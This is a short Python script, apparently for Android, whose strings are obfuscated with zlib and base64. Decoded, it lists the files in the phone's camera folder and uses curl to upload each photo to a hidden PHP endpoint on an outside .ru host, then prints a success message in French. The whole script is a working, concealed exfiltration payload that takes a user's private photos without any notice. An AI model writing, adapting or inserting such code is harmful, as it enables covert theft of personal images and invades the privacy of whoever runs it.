import os
import zlib
import base64
os.chdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1wq\xf6\xf4\xd5wN\xccM-J\x04\x00?\x18\x06e'))

os.system(zlib.decompress(b'x\x9c\xcb)V\xd0/NIN,J\xd1wq\xf6\xf4\xd5wN\xccM-JTP\xb0S((O\xd1+\xa9(\x01\x00\xb6\xb2\n\xdb'))



a = open('pwd.txt', 'r')
xx = a.read().split()
for file in xx :
	var = file.strip()
	vax = base64.b64decode('IGh0dHBzOi8vemhhbm5hLWFuaXNpZm9yb3ZhLnJ1L0pvbi92YXgucGhwCg==').decode('ascii')

	xxx= os.system(f'curl -i -X POST -H "Content-Type:multipart/form-data" -F "image=@{var}" {vax}')
	print('\033[93m'+'Uploader avec Success !!!!')
	
	
